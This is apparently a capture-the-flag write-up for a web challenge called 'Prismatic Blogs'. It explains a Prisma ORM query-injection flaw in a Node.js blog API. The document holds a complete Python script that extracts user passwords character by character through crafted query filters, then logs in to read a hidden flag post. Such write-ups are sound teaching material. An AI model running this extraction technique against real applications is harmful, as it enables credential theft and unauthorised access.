---
category: web
---
# Prismatic Blogs

## Information
The problem gives you the following files:
- `index.js`
- `package.json`
- `schema.prisma`
- `seed.js`

From this, we know it is a Node JS project that relies on the Prisma ORM.

In `index.js`, we get two routes:
- `GET /api/posts`
- `POST /api/login`

In `schema.prisma` we learn that posts are either published or unpublished.

In `seed.js` we learn the users' names and that their passwords are random. We also find that there is an unpublished post that contains the flag:
```js
{
	title: `The Flag`,
	body: `This is a secret blog I am still working on. The secret keyword for this blog is ${FLAG}`,
	authorId: Math.floor(Math.random()*NUM_USERS)+1,
	published: false
}
```

`GET /api/posts` does hides unpublished posts, but `POST /api/login` shows published posts. Therefore, the exploit must find the user credentials.

## Exploit

`GET /api/posts` has a pseudo-SQL injection problem, since it uses `req.query`, attacker-controlled data, as the `where` clause in the Prisma ORM:
```js
app.get(
  "/api/posts",
  async (req, res) => {
    try {
      let query = req.query;
      query.published = true;
      let posts = await prisma.post.findMany({where: query});
      res.json({success: true, posts})
    } catch (error) {
      res.json({ success: false, error });
    }
  }
);
```

For example:
![[Pasted image 20250121131821.png]]

We can use this to make a request to `/api/posts?author[name]={name}&author[password][startsWith]={password}` to determine the password. However, `startsWith` does a case-insensitive search, so once we find the passwords, we need to use `gt` and `lt` to do alphabetical string comparison.

Here is the full script:
```python
import requests
import pwn

pwn.log.level = pwn.logging.DEBUG

URL = "http://localhost:3000"

names = ["White", "Bob", "Tommy", "Sam"]
characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

def check_password_starts_with(name: str, password: str) -> bool:
    url = f"{URL}/api/posts?author[name]={name}&author[password][startsWith]={password}"
    pwn.debug(f"{name} {password}")
    data = requests.get(url).json()
    return len(data["posts"]) > 0

def find_password(name: str) -> str:
    password = ""
    for _ in range(100):
        for char in characters:
            if check_password_starts_with(name, password + char):
                password += char
                break
        else:
            break
    return password

def check_password_casing(name: str, password: str) -> bool:
    url = f"{URL}/api/posts?author[name]={name}&author[password][gt]={password}a&author[password][lt]={password}z"
    pwn.debug(f"{name} {password}")
    data = requests.get(url).json()
    return len(data["posts"]) > 0

def find_password_casing(name: str, password: str) -> str:
    fixed_password = ""
    for char in password:
        if check_password_casing(name, fixed_password):
            fixed_password += char.lower()
        else:
            fixed_password += char.upper()
    return fixed_password

def get_flag(name: str, password: str):
    url = f"{URL}/api/login"
    data = requests.post(url, json={"name": name, "password": password}).json()
    for post in data["posts"]:
        if "uoft" in post["body"].lower():
            pwn.info(post["body"])

passwords = {}

for name in names:
    password = find_password(name)
    password = find_password_casing(name, password)
    passwords[name] = password

for name, password in passwords.items():
    pwn.info(f"{name}'s password is {password}")
    get_flag(name, password)
```